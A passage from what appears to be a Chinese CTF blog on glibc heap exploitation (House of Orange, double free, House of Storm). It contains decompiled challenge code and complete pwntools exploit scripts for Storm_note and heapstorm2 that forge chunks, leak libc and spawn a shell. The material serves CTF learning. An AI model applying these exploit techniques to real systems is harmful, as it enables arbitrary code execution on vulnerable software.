:u32(data.ljust(4,'\\0'))\nuu64    = lambda data               :u64(data.ljust(8,'\\0'))\nleak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))\nlg=lambda address,data:log.success('%s: '%(address)+hex(data))\n#定义gdb调试函数\ndef dbg():\n        gdb.attach(sh)\n        pause()\ndef add(size, content, price='2', color='1'):\n    ru(\"Your choice : \")\n    sl('1')\n    ru(\"Length of name :\")\n    sl(str(size))\n    ru(\"Name :\")\n    sh.send(content)\n    ru(\"Price of Orange:\")\n    sl(str(price))\n    ru(\"Color of Orange:\")    #1-7\n    sl(str(color))\n\n\ndef show():\n    ru(\"Your choice : \")\n    sl('2')\n\ndef edit(size, content, price='2', color='1'):\n    ru(\"Your choice : \")\n    sl('3')\n    ru(\"Length of name :\")\n    sl(str(size))\n    ru(\"Name:\")\n    sh.send(content)\n    ru(\"Price of Orange:\")\n    sl(str(price))\n    ru(\"Color of Orange:\")    #1-7\n    sl(str(color))\n\n\n\nadd(0x30,'aaaa\\n')\n#dbg()\npayload = 'a' * 0x30 +p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0) * 2 + p64(0xf81)\n \nedit(len(payload), payload)\n#dbg()\nadd(0x1000, 'a\\n')\n#dbg()\nadd(0x400, 'a' * 8)\n#dbg()\nshow()\nru('a'*8)\nlibc.address = u64(ru('\\x7f').ljust(8, '\\x00')) - 0x3c5188\nlg('libc.address',libc.address)\n  \nio_list_all = libc.symbols['_IO_list_all']\nsystem = libc.symbols['system']\n\npayload = 'b' * 0x10\n \n\nedit(0x10, payload)\n\nshow()\nru('b'*0x10)\nheap = u64(sh.recvuntil('\\n').strip().ljust(8, '\\x00'))\nheap_base = heap - 0xE0\nlg('heap_base',heap_base)\n#dbg()\n \npayload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0)\nfake_file = '/bin/sh\\x00'+p64(0x61)#to small bin\nfake_file += p64(0)+p64(io_list_all-0x10)\nfake_file += p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptr\nfake_file = fake_file.ljust(0xc0,'\\x00')\nfake_file += p64(0) * 3\nfake_file += p64(heap_base+0x5E8) #vtable ptr\nfake_file += p64(0) * 2\nfake_file += p64(system)\npayload += fake_file\nedit(len(payload), payload)\n#dbg()\n \nru(\"Your choice : \")\nsl('1')\n\nitr()\n\n可能因为本地环境没配好，打不通，在buu上远程可以打通\n\n参考文章houseoforange_hitcon_2016houseoforange_hitcon_2016\n\n","tags":["House of 系列"]},{"title":"doublefree","url":"/2023/04/10/double%20free/","content":"利用条件\n1.fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空2.fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。\n\n该漏洞是指将同一个chunk free两次，通常情况下free两个chunk会报错是无法编译的，监测机制也很简单，就仅仅是对free变量与前一个进行对比，所以可以中间夹一个其他的实现：\nfree(shangu1)\nfree(shangu2)\nfree(shangu1)\n\n此时的 bins 中情况大概如下：0x20 —&gt; shangu1 —&gt; shangu2 —&gt; shangu1当再次申请堆时会出现 有两个指针指向同一个chunk\n![联想截图_20230322221849.png](https://s2.loli.net/2023/09/12/BI6lRtbdPnKTuMN.png\n","tags":["heap"]},{"title":"House of Storm","url":"/2023/04/10/House%20of%20Storm/","content":"House of storm结合了unsorted_bin_attack和Largebin_attack的攻击技术,实现任意地址分配chunk，任意地址写。\n利用条件:1.需要攻击者在largebin和unsorted_bin中分别布置一个chunk ，\n  这两个chunk需要在归位之后处于同一个largebin的index中，\n  且unsortedbin中的chunk要比largebin中的大\n2.需要unsorted_bin中的bk指针可控\n3.需要largebin中的bk指针和bk_nextsize指针可控\n4.glibc版本小于2.30,因为2.30之后加入了检查\n\nlargebin中size与index的对应关系size    index\n[0x400 , 0x440)   \t 64\n[0x440 , 0x480)    \t 65\n[0x480 , 0x4C0)   \t 66\n[0x4C0 , 0x500)   \t 67\n[0x500 , 0x540)   \t 68\n等差 0x40    …\n[0xC00 , 0xC40)    \t 96\n[0xC40 , 0xE00)      97\n[0xE00 , 0x1000)     98\n[0x1000 , 0x1200)    99\n[0x1200 , 0x1400)    100\n[0x1400 , 0x1600)    101\n等差 0x200    …\n[0x2800 , 0x2A00)    111\n[0x2A00 , 0x3000)    112\n[0x3000 , 0x4000)    113\n[0x4000 , 0x5000)    114\n等差 0x1000    …\n[0x9000 , 0xA000)      119\n[0xA000 , 0x10000)     120\n[0x10000 , 0x18000)    121\n[0x18000 , 0x20000)    122\n[0x20000 , 0x28000)    123\n[0x28000 , 0x40000)    124\n[0x40000 , 0x80000)    125\n[0x80000 , …. )        126\n\n利用方法1.将unsorted_bin中的bk指针改为fake_chunk\n2.largebin中的bk指针改为fake_chunk+8，bk_nextsize指针改为fake_chunk-0x18-5\t,\n（target为要修改的目标地址，fake_chunk为target-0x20）\n 来满足victim-&gt;bk_nextsize-&gt;fd_nextsize = victim（即fake_chunk-0x18-5=victim）\n3.再次malloc获得target地址处的chunk，可修改target地址处的值\n\nHouse_of_storm的精髓所在——伪造size，如果在程序开启PIE的情况下，堆地址的开头通常是0x55或者0x56开头，且我们的堆地址永远都是6个字节，且如果是小端存储的话，减去五个字节，剩下的就是0x55了。如果提前5个字节开始写堆地址，那么伪造在size字段上面的就正好是0x55。如果后续再申请堆块时，通过对齐使0x55对齐之后和攻击者申请的size正好相同的话，就可以在任意地址上申请出来一个chunk，也就可以达成后续的任意地址写操作。之所以是0x56是因为__int_malloc在拿到chunk后返回到__libc_malloc，__libc_malloc会对chunk的进行检查，这里如果有错的话会直接crash，必须满足以下条件之一即可：\n1. victim 为 0\n2. IS_MMAPPED 为 1\n3. NON_MAIN_ARENA 为 0\n\n0x56（二进制数为0101 0110）满足条件0x55（二进制数为0101 0101）不满足条件但是由于程序有随机化，多运行几次总能有一次成功的。\nunsorted_bin-&gt;fd = 0\nunsorted_bin-&gt;bk = fake_chunk\n\nlarge_bin-&gt;fd = 0\nlarge_bin-&gt;bk = fake_chunk+8\nlarge_bin-&gt;fd_nextsize = 0\nlarge_bin-&gt;bk_nextsize = fake_chunk - 0x18 -5\n\n例题2019 西湖论剑 Storm_note保护全开，实现四个功能，增改删退，ida查看伪代码init_proc()函数，mallopt()函数，设置fastbin 范围最大为0，禁用了fastbin，之后用mmap在 0xABCD0100处分配0x30大小的空间，填充上了随机数\ninit_proc()函数 ssize_t init_proc()\n{\n  ssize_t result; // rax\n  int fd; // [rsp+Ch] [rbp-4h]\n\n  setbuf(stdin, 0LL);\n  setbuf(stdout, 0LL);\n  setbuf(stderr, 0LL);\n  if ( !mallopt(1, 0) )                         // mallopt(M_MXFAST,0)将global_max_fast设置为0,\n                                                // 这个值的意思是最大为多大的chunk归fastbin管理,\n                                                // 设置为0表示这个程序中不再存在fastbin。\n                                                // 即本程序禁用了fastbin。\n    exit(-1);\n  if ( mmap(0xABCD0000LL, 0x1000uLL, 3, 34, -1, 0LL) != 0xABCD0000LL )\n    exit(-1);\n  fd = open(\"/dev/urandom\", 0);\n  if ( fd &lt; 0 )\n    exit(-1);\n  result = read(fd, 0xABCD0100LL, 0x30uLL);\n  if ( result != 48 )\n    exit(-1);\n  return result;\n}\n\nadd函数calloc函数来分配堆空间，因此返回前会对分配的堆的内容进行清零。\nunsigned __int64 alloc_note()\n{\n  int size; // [rsp+0h] [rbp-10h] BYREF\n  int i; // [rsp+4h] [rbp-Ch]\n  unsigned __int64 v3; // [rsp+8h] [rbp-8h]\n\n  v3 = __readfsqword(0x28u);\n  for ( i = 0; i &lt;= 15 &amp;&amp; note[i]; ++i )\n    ;\n  if ( i == 16 )\n  {\n    puts(\"full!\");\n  }\n  else\n  {\n    puts(\"size ?\");\n    _isoc99_scanf(\"%d\", &amp;size);\n    if ( size &gt; 0 &amp;&amp; size &lt;= 0xFFFFF )\n    {\n      note[i] = calloc(size, 1uLL);             // calloc函数来分配堆空间，因此返回前会对分配的堆的内容进行清零。\n                                                // \n      note_size[i] = size;\n      puts(\"Done\");\n    }\n    else\n    {\n      puts(\"Invalid size\");\n    }\n  }\n  return __readfsqword(0x28u) ^ v3;\n}\n\nedit函数存在off-by-null\nunsigned __int64 edit_note()\n{\n  unsigned int size; // [rsp+0h] [rbp-10h] BYREF\n  int v2; // [rsp+4h] [rbp-Ch]\n  unsigned __int64 v3; // [rsp+8h] [rbp-8h]\n\n  v3 = __readfsqword(0x28u);\n  puts(\"Index ?\");\n  _isoc99_scanf(\"%d\", &amp;size);\n  if ( size &lt;= 0xF &amp;&amp; note[size] )\n  {\n    puts(\"Content: \");\n    v2 = read(0, note[size], note_size[size]);\n    *(note[size] + v2) = 0;                     // off-by-null\n                                                // \n    puts(\"Done\");\n  }\n  else\n  {\n    puts(\"Invalid index\");\n  }\n  return __readfsqword(0x28u) ^ v3;\n}\n\nfree函数无uaf\nunsigned __int64 delete_note()\n{\n  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF\n  unsigned __int64 v2; // [rsp+8h] [rbp-8h]\n\n  v2 = __readfsqword(0x28u);\n  puts(\"Index ?\");\n  _isoc99_scanf(\"%d\", &amp;v1);\n  if ( v1 &lt;= 0xF &amp;&amp; note[v1] )\n  {\n    free(note[v1]);\n    note[v1] = 0LL;\n    note_size[v1] = 0;\n  }\n  else\n  {\n    puts(\"Invalid index\");\n  }\n  return __readfsqword(0x28u) ^ v2;\n}\n\n一个后门函数要想执行system(“/bin/sh”);，需要输入与程序一开始分配的随机数相同的数\nvoid __noreturn backdoor()\n{\n  char buf[56]; // [rsp+0h] [rbp-40h] BYREF\n  unsigned __int64 v1; // [rsp+38h] [rbp-8h]\n\n  v1 = __readfsqword(0x28u);\n  puts(\"If you can open the lock, I will let you in\");\n  read(0, buf, 0x30uLL);\n  if ( !memcmp(buf, 0xABCD0100LL, 0x30uLL) )\n    system(\"/bin/sh\");\n  exit(0);\n}\n\n思路1、利用off-by-null 漏洞构造堆风水，实现堆块重叠，从而控制堆块内容。2、House of storm，将处于unsortedbin的可控制的chunk放入largebin中，以便触发largebin attack3、控制largebin的bk和bk_nextsize指针，通过malloc触发漏洞，分配到目标地址，实现任意地址写，将0xABCD0100处的0x30字节改为已知值，获得shell\n过程先把前面的东西写好\n# coding=utf-8\nfrom pwn import *\n#context(endian='little',os='linux',arch='amd64',log_level='debug')\nsh = process('./Storm_note')\n\ns       = lambda data               :sh.send(data)\nsa      = lambda delim,data         :sh.sendafter(delim, data)\nsl      = lambda data               :sh.sendline(data)\nsla     = lambda delim,data         :sh.sendlineafter(delim, data)\nr       = lambda num=4096           :sh.recv(num)\nru      = lambda delims\t\t    :sh.recvuntil(delims)\nitr     = lambda                    :sh.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\0'))\nuu64    = lambda data               :u64(data.ljust(8,'\\0'))\nleak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))\nlg      = lambda address,data       :log.success('%s: '%(address)+hex(data))\ndef dbg():\n        gdb.attach(sh)\n        pause()\n\n\ndef add(size):\n  sla('Choice','1')\n  sla('?',str(size))\n\ndef edit(index,text):\n  sla('Choice','2')\n  sla('?',str(index))\n  sa('Content',text)\n\ndef free(index):\n  sla('Choice','3')\n  sla('?',str(index))\n\n首先申请两组chunk，用来构造堆块重叠，并进入unsortedbin和largebin\nadd(0x18)#0\nadd(0x508)#1\nadd(0x18)#2\n\nadd(0x18)#3\nadd(0x508)#4\nadd(0x18)#5\n\nadd(0x18)#6\ndbg()\n\n\n然后构造两个伪造的prev_size，用于绕过malloc检查，保护下一个chunk的prev_size不被修改。\nedit(1,'a'*0x4f0+p64(0x500)) \nedit(4,'a'*0x4f0+p64(0x500)) \n\ndbg()\n\n然后再free(1)，利用off-by-null编辑chunk_0，将chunk_1的size从0x510改为0x500，由于刚才构造的两个fake chunk，此时堆块已合并\nfree(1)\nedit(0,'a'*0x18)#off-by-null改写chunk1的size为0x500\n\ndbg()\n\n再申请两个chunk，使之恢复正常，之后free掉chunk_1和chunk_2，使之合并\nadd(0x18)#1\nadd(0x4d8)#7  \n\nfree(1)\nfree(2)    \n\ndbg()\n\n再次申请两个特定大小的chunk即可实现chunk7可以控制原unsortedbin chunk 0x4f1的bk指针，即我们可以用chunk_7来控制chunk_2(unsortedbin chunk),为便于理解我们可查看一下note这个存放全局chunk mem指针的数组\nadd(0x30)#1 此时chunk1可以控制原unsortedbin chunk  0x4f1(chunk_2)的bk指针\nadd(0x4e0)#2\ndbg()\n\n下面同理获得chunk8可以控制原 （largebin chunk 0x4e1 ）的bk指针和bk_nextsize指针\nfree(4)\nedit(3,'a'*0x18)#off by null\nadd(0x18)#4\nadd(0x4d8)#8 0x5a0\nfree(4)\nfree(5)\nadd(0x40)#4 0x580\n\n之后free(2)，放入unsortedbin\nfree(2)    \n\ndbg()\n\n再申请回来0x4e8（0x4f0）大小的chunk，使0x4e0大小的chunk进入largebin\nadd(0x4e8)      # put chunk8(0x5c0) to largebin\n\ndbg()\n\n再次free(2)，构造一个unsortedbin chunk和一个largebin chunk\nfree(2) #put chunk2 to unsortedbin\n\ndbg()\n\n之后利用刚才构造的堆块重叠，修改unsortedbin chunk的bk指针为目标地址（target-0x20）\ntarget = 0xabcd0100\nfake_chunk = target - 0x20\n\npayload = p64(0)*2 + p64(0) + p64(0x4f1) # size\npayload += p64(0) + p64(fake_chunk)      # bk\nedit(7,payload)\n\ndbg()\n\n之后利用刚才构造的堆块重叠，修改largebin chunk的bk指针和bk_nextsize指针分别为fake_chunk+8，和fake_chunk-0x18-5\npayload2 = p64(0)*4 + p64(0) + p64(0x4e1) #size\npayload2 += p64(0) + p64(fake_chunk+8)   \npayload2 += p64(0) + p64(fake_chunk-0x18-5)#mmap\n\nedit(8,payload2)\n\ndbg()\n\n然后申请0x40（0x50）大小的chunk，可以看到在目标地址处0xabcd00e0成功伪造fake chunk，size为0x56，巧妙的实现victim-&gt;bk_nextsize-&gt;fd_nextsize = victim\nadd(0x40)\n\ndbg()\n\n之后就是把0xABCD0100处的0x30个字节改为已知数，然后获得shell\npayload = '\\x00'*(0x10+0x30)\nedit(2,payload)\n\ndbg()\n\n\n    sla('Choice: ','666')\n    s(p64(0)*6)\n    itr()\n\n\nexp# coding=utf-8\nfrom pwn import *\n#context(endian='little',os='linux',arch='amd64',log_level='debug')\nsh = process('./Storm_note')\n\ns       = lambda data               :sh.send(data)\nsa      = lambda delim,data         :sh.sendafter(delim, data)\nsl      = lambda data               :sh.sendline(data)\nsla     = lambda delim,data         :sh.sendlineafter(delim, data)\nr       = lambda num=4096           :sh.recv(num)\nru      = lambda delims\t\t    :sh.recvuntil(delims)\nitr     = lambda                    :sh.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\0'))\nuu64    = lambda data               :u64(data.ljust(8,'\\0'))\nleak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))\nlg      = lambda address,data       :log.success('%s: '%(address)+hex(data))\ndef dbg():\n        gdb.attach(sh)\n        pause()\n\n\ndef add(size):\n  sla('Choice','1')\n  sla('?',str(size))\n\ndef edit(index,text):\n  sla('Choice','2')\n  sla('?',str(index))\n  sa('Content',text)\n\ndef free(index):\n  sla('Choice','3')\n  sla('?',str(index))\n#---------------布置chunk-------------------------#\nadd(0x18)#0\nadd(0x508)#1\nadd(0x18)#2\n\nadd(0x18)#3\nadd(0x508)#4\nadd(0x18)#5\n\nadd(0x18)#6\n\n\n#dbg()\n#构造两个伪造的prev_size，用于绕过malloc检查，保护下一个chunk的prev_size不被修改。\nedit(1,'a'*0x4f0+p64(0x500)) \nedit(4,'a'*0x4f0+p64(0x500)) \n\n#dbg()\n#----------------准备 unsorted chunk-----------------------#\nfree(1)\nedit(0,'a'*0x18)#off-by-null改写chunk1的size为0x500\n\n#dbg()\n\nadd(0x18)#1\nadd(0x4d8)#7  \n\nfree(1)\nfree(2)    \n\n#dbg()\n\n#recover\nadd(0x30)#1 此时chunk7可以控制原 （unsortedbin chunk  0x4f1）的bk指针\nadd(0x4e0)#2\n#-------------------准备 large chunk-----------------------------------#\n#dbg()\n#下面同理获得chunk8可以控制原 （largebin chunk 0x4e1 ）的bk指针和bk_nextsize指针\nfree(4)\nedit(3,'a'*0x18)#off by null\nadd(0x18)#4\nadd(0x4d8)#8 0x5a0\nfree(4)\nfree(5)\nadd(0x40)#4 0x580\n\n #---------------unsorted chunk 和 large chunk 放到对应位置----------------------#\nfree(2)    #unsortedbin-&gt; chunk2 -&gt; chunk5(chunk8)(0x5c0)    which size is largebin FIFO\n \n#dbg()\n#\nadd(0x4e8)      # put chunk8(0x5c0) to largebin\n\n#dbg()\n\nfree(2) #put chunk2 to unsortedbin\n\n#dbg()\n #--------------修改他们是的满足条件进行 house of strom------------------------------#\ntarget = 0xabcd0100\nfake_chunk = target - 0x20\n\npayload = p64(0)*2 + p64(0) + p64(0x4f1) # size\npayload += p64(0) + p64(fake_chunk)      # bk\nedit(7,payload)\n\n#dbg()\n\npayload2 = p64(0)*4 + p64(0) + p64(0x4e1) #size\npayload2 += p64(0) + p64(fake_chunk+8)   \npayload2 += p64(0) + p64(fake_chunk-0x18-5)#mmap\n\nedit(8,payload2)\n\n#dbg()\n\nadd(0x40)\n\n#dbg()\n\npayload = '\\x00'*(0x10+0x30)\nedit(2,payload)\n\n#dbg()\n\nsla('Choice: ','666')\ns(p64(0)*6)\nitr()\n\n0ctf_2018_heapstorm2同样是保护全开，\nmain实现四个功能，增删改查\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  __int64 v4; // [rsp+8h] [rbp-8h]   \t//v4=0x13370800\n\n  v4 = sub_BE6();\n\n  while ( 1 )\n  {\n    menu();\n    switch ( chioce(a1, a2) )\n    {\n      case 1LL:\n        a1 = v4;\n        add(v4);\n        break;\n      case 2LL:\n        a1 = v4;\n        up(v4);\n        break;\n      case 3LL:\n        a1 = v4;\n        delete(v4);\n        break;\n      case 4LL:\n        a1 = v4;\n        show(v4);\n        break;\n      case 5LL:\n        return 0LL;\n      default:\n        continue;\n    }\n  }\n}\n\n主函数里有个sub_BE6()函数，其中禁用了fastbin，并且用mmap在0x13370000处分配了大小为0x1000的chunk，从/dev/urandom中读取了3个随机数到0x13370800处，还调用了两个异或函数，由后面可知，是对chunk的头指针和size进行了异或加密，返回0x13370800给v4，这里相当于有四个随机数，第三个和第四个随机数相同\n__int64 sub_BE6()\n{\n  int i; // [rsp+8h] [rbp-18h]\n  int fd; // [rsp+Ch] [rbp-14h]\n\n  setvbuf(stdin, 0LL, 2, 0LL);\n  setvbuf(_bss_start, 0LL, 2, 0LL);\n  alarm(0x3Cu);\n  puts(\n    \"    __ __ _____________   __   __    ___    ____\\n\"\n    \"   / //_// ____/ ____/ | / /  / /   /   |  / __ )\\n\"\n    \"  / ,&lt;  / __/ / __/ /  |/ /  / /   / /| | / __  |\\n\"\n    \" / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /\\n\"\n    \"/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/\\n\");\n  puts(\"===== HEAP STORM II =====\");\n  if ( !mallopt(1, 0) )                         // 禁用fastbin\n    exit(-1);\n  if ( mmap(0x13370000, 0x1000uLL, 3, 34, -1, 0LL) != 322371584 )\n    exit(-1);\n  fd = open(\"/dev/urandom\", 0);\n  if ( fd &lt; 0 )\n    exit(-1);\n  if ( read(fd, 0x13370800, 0x18uLL) != 24 )\n    exit(-1);\n  close(fd);\n  MEMORY[0x13370818] = MEMORY[0x13370810];\n  for ( i = 0; i &lt;= 15; ++i )\n  {\n    *(16 * (i + 2LL) + 0x13370800) = ptr_xor(0x13370800, 0LL);\n    *(16 * (i + 2LL) + 0x13370808) = size_xor(0x13370800LL, 0LL);\n  }\n  return 0x13370800LL;\n}\n\nptr_xor()__int64 __fastcall ptr_xor(_QWORD *a1, __int64 a2)\n{\n  return *a1 ^ a2;     //a1为第一个随机数\n}\n\nsize_xor()__int64 __fastcall size_xor(__int64 a1, __int64 a2)\n{\n  return a2 ^ *(a1 + 8);\t//a1+8为第一个随机数\n}\n\nreadd函数存在一个off-by-one\nunsigned __int64 __fastcall sub_1402(__int64 a1, __int64 a2)\n{\n  __int64 v3; // rax\n  char buf; // [rsp+17h] [rbp-19h] BYREF\n  unsigned __int64 v5; // [rsp+18h] [rbp-18h]\n  ssize_t v6; // [rsp+20h] [rbp-10h]\n  unsigned __int64 v7; // [rsp+28h] [rbp-8h]\n\n  v7 = __readfsqword(0x28u);\n  if ( !a2 )\n    return 0LL;\n  v5 = 0LL;\n  while ( a2 - 1 &gt; v5 )\n  {\n    v6 = read(0, &amp;buf, 1uLL);\n    if ( v6 &gt; 0 )\n    {\n      if ( buf == 10 )\n        break;\n      v3 = v5++;\n      *(v3 + a1) = buf;\n    }\n    else if ( *_errno_location() != 11 &amp;&amp; *_errno_location() != 4 )\n    {\n      break;\n    }\n  }\n  *(a1 + v5) = 0;                               // off-by-null\n  return v5;\n}\n\nadd函数只能申请0xC 到0x1000的chunk，且chunk的头指针和size用 了异或加密，由上面的异或函数可知只是用了前两个随机数,并且我们看到chunk的头指针和size是 在0x13370800+4*0x8处开始存放的，按照mem指针+size顺序依次存放\nvoid __fastcall add(__int64 a1)\n{\n  int i; // [rsp+10h] [rbp-10h]\n  int size; // [rsp+14h] [rbp-Ch]\n  void *v3; // [rsp+18h] [rbp-8h]\n\n  for ( i = 0; i &lt;= 15; ++i )\n  {\n    if ( !size_xor(a1, *(16 * (i + 2LL) + a1 + 8)) )\n    {\n      printf(\"Size: \");\n      size = chioce();\n      if ( size &gt; 12 &amp;&amp; size &lt;= 4096 )\n      {\n        v3 = calloc(size, 1uLL);\n        if ( !v3 )\n          exit(-1);\n        *(16 * (i + 2LL) + a1 + 8) = size_xor(a1, size);\n        *(16 * (i + 2LL) + a1) = ptr_xor(a1, v3);\n        printf(\"Chunk %d Allocated\\n\", i);\n      }\n      else\n      {\n        puts(\"Invalid Size\");\n      }\n      return;\n    }\n  }\n}\n\nedit函数读入的数据+12要小于等于申请时写的size,我们读入的数据会追加上一个12字节字符串再加上一个0结尾，所以存在off_by_null但是prev_size无法控制。\nint __fastcall edit(_QWORD *a1)\n{\n  signed int v2; // [rsp+10h] [rbp-20h]\n  int v3; // [rsp+14h] [rbp-1Ch]\n  __int64 v4; // [rsp+18h] [rbp-18h]\n\n  printf(\"Index: \");\n  v2 = chioce();\n  if ( v2 &gt; 0xF || !size_xor(a1, a1[2 * v2 + 5]) )\n    return puts(\"Invalid Index\");\n  printf(\"Size: \");\n  v3 = chioce();\n  if ( v3 &lt;= 0 || v3 &gt; (size_xor(a1, a1[2 * v2 + 5]) - 12) )\n    return puts(\"Invalid Size\");\n  printf(\"Content: \");\n  v4 = ptr_xor(a1, a1[2 * v2 + 4]);\n  sub_1377(v4, v3);\n  strcpy((v3 + v4), \"HEAPSTORM_II\");\n  return printf(\"Chunk %d Updated\\n\", v2);\n}\n\nfree函数不存在uaf\nint __fastcall sub_109B(_QWORD *a1)\n{\n  void *v2; // rax\n  signed int v3; // [rsp+1Ch] [rbp-4h]\n\n  printf(\"Index: \");\n  v3 = chioce();\n  if ( v3 &gt; 0xF || !size_xor(a1, a1[2 * v3 + 5]) )\n    return puts(\"Invalid Index\");\n  v2 = ptr_xor(a1, a1[2 * v3 + 4]);\n  free(v2);\n  a1[2 * v3 + 4] = ptr_xor(a1, 0LL);\n  a1[2 * v3 + 5] = size_xor(a1, 0LL);\n  return printf(\"Chunk %d Deleted\\n\", v3);\n}\n\nshow函数需要满足 (a1[3] ^ a1[2]) == 0x13377331才能使用该函数，也就是第2个随机数和第3个随机数异或后为0x13377331才行\n    int __fastcall sub_11B5(_QWORD *a1)\n{\n  __int64 v2; // rbx\n  __int64 v3; // rax\n  signed int v4; // [rsp+1Ch] [rbp-14h]\n\n  if ( (a1[3] ^ a1[2]) != 0x13377331LL )\n    return puts(\"Permission denied\");\n  printf(\"Index: \");\n  v4 = chioce();\n  if ( v4 &gt; 0xF || !size_xor(a1, a1[2 * v4 + 5]) )\n    return puts(\"Invalid Index\");\n  printf(\"Chunk[%d]: \", v4);\n  v2 = size_xor(a1, a1[2 * v4 + 5]);\n  v3 = ptr_xor(a1, a1[2 * v4 + 4]);\n  sub_14D4(v3, v2);\n  return puts(byte_180A);\n}\n\n思路题目保护全开，我们想到的是把free_hook改为system地址，而我们首先得泄露出libc基地址，就必须利用show函数，要想利用show函数，就必须修改第3个随机数和第4个随机数的值，使它们异或后为0x13377331，随机数是在0x13370800处，我们就想到要将chunk分配到0x13370800处，程序允许我们分配最大0x1000大小的chunk，可以使用House of storm来将chunk分配到0x13370800处，这样我们不仅控制了四个随机数，还控制了chunk的全局数组\n过程先把前面的东西写好\n#coding:utf-8\nfrom pwn import *\ncontext(endian='little',os='linux',arch='amd64',log_level='debug')\nsh = process('./0ctf_2018_heapstorm2')\nlibc = ELF('./libc-2.23.so')\n#命令简写化\ns       = lambda data               :sh.send(data)\nsa      = lambda delim,data         :sh.sendafter(delim,data)\nsl      = lambda data               :sh.sendline(data)\nsla     = lambda delim,data         :sh.sendlineafter(delim,data)\nr       = lambda num=4096           :sh.recv(num)\nrl      = lambda num=4096           :sh.recvline(num)\nru      = lambda delims   :sh.recvuntil(delims )\nitr     = lambda                    :sh.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\0'))\nuu64    = lambda data               :u64(data.ljust(8,'\\0'))\nleak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))\ndef dbg():\n    gdb.attach(sh)\n    pause()\ndef add(size):\n    sla('Command: ','1')\n    sla('Size: ',str(size))  # 12&lt;size&lt;0x1000\n\n\ndef edit(idx,content):\n    sla('Command: ','2')\n    sla('Index: ',str(idx))\n    sla('Size: ',str(len(content)))\n    sa('Content: ',content)\n\n\n\ndef free(idx):\n    sla('Command: ','3')\n    sla('Index: ',str(idx))\n\n\ndef show(idx):\n    sla('Command: ','4')\n    sla('Index: ',str(idx))\n\n和上一题一样，先构造一个unsortedbin和largebin，并且利用off-by-null来实现控制unsortedbin chunk的bk指针和largebin chunk的bk和bk_size指针，然后再malloc chunk，将chunk分配到0x13370800处，这里要注意的是这道题的edit函数有点不同，会把我们输入的字节后面加上12字节再加一个’\\x00’，所以我们每次edit都要少输入12字节即可实现0ff-by-null。\n#---------------布置chunk-------------------------#\nadd(0x18)#0\t   \nadd(0x508)#1\nadd(0x18)#2\n\nadd(0x18)#3   \nadd(0x508)#4\nadd(0x18)#5   \n\nadd(0x18)#6   \n\n#----------------准备 unsorted chunk-----------------------#\nedit(1,'\\x00'*0x4F0+p64(0x500)) \nfree(1)\nedit(0,'\\x00'*(0x18-12))\nadd(0x18) #1 \nadd(0x4d8) #7   \n\nfree(1)   \nfree(2) #1-2\n\nadd(0x38)#1\nadd(0x4e8)#2  \n\n#-------------------准备 large chunk-----------------------------------#\nedit(4,'\\x00'*0x4F0+p64(0x500))\nfree(4)\nedit(3,'\\x00'*(0x18-12)) \nadd(0x18) #4\nadd(0x4d8) #8\n\nfree(4)\nfree(5) #4-5 \n\nadd(0x48)#4  \n#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#\nfree(2)\nadd(0x4e8) \nfree(2) \n#--------------修改他们是的满足条件进行 house of strom------------------------------#\nfake_chunk = 0x13370800 - 0x20\npayload = '\\x00' * 0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)\nedit(7, payload) #修改unsorted chunk的bk\n\npayload = '\\x00' * 0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) + p64(0) + p64(fake_chunk-0x18-5)\nedit(8, payload)  \nadd(0x48) \n\n现在我们已经可以控制0x13370800处的值了，我们把这些随机数都改为0，然后把chunk_0改为0x13370800，以此来实现控制\n#-----------------------泄漏 libc----------------------------------#\n#由于bins中的chunk的fd,bk指向libc的地址，我们先要泄漏heap的地址\n\npayload = p64(0)*6 + p64(0x13370800)\nedit(2, payload) #修改了r0~r4为0，并且修改了chunk0的地址，此时的chunk0的size非常大，因为异或的是0\n\ndbg()\n\n\n\n之后修改0x13370800处的第三个和第四个数分别为0和0x13377331，两者异或得到0x13377331，越过show函数的检查，此时已经可以使用show函数，因为我们要泄露的unsortedbin chunk的fd指针（指向main_arena+88），我们必须在chunk的全局数组中写入0x56104462a060来show，但是程序每次运行地址不同，由上图可知fake_chunk+3处存放的就是0x56104462a060，所以我们需要利用fake_chunk+3（unsortedbin chunk的地址）来泄露libc，我们每次把chunk0的位置写为0x13370800，就可以实现每次通过chunk0来控制0x13370800\npayload = p64(0)*3 +p64(0x13377331)  #满足show的条件\npayload += p64(0x13370800) + p64(0x1000) #chunk0\npayload += p64(fake_chunk+3) + p64(8)   #chunk1\nedit(0, payload) #满足show的条件\n\nshow(1)  #我们刚刚house of storm 写的地址泄漏出来\nru(\"]: \")\nheap = u64(r(6).ljust(8, '\\x00'))\nsuccess(\"heap:\"+hex(heap))\n\ndbg()\n\n\n此时我们成功泄露出unsortedbin chunk的地址，我们再修改全局数组为unsortedbin chunk的地址+0x10（main_arena+88），然后即可泄露处libc基地址\npayload  = p64(0)*3 + p64(0x13377331)#满足show的条件\npayload += p64(0x13370800) + p64(0x1000) #chunk0\npayload += p64(heap+0x10) + p64(8) #chunk1\nedit(0, payload)\nshow(1) #泄漏libc地址\nru(\"]: \")\nmalloc_hook = u64(r(6).ljust(8, '\\x00')) -0x58 - 0x10\nlibc_base = malloc_hook - libc.sym['__malloc_hook']\nfree_hook = libc_base+libc.sym['__free_hook']\nsystem = libc_base+ libc.sym['system']\nsuccess(\"free_hook:\"+hex(free_hook))\ndbg()\n\n\n之后我们要做到就是在全局数组里写入free 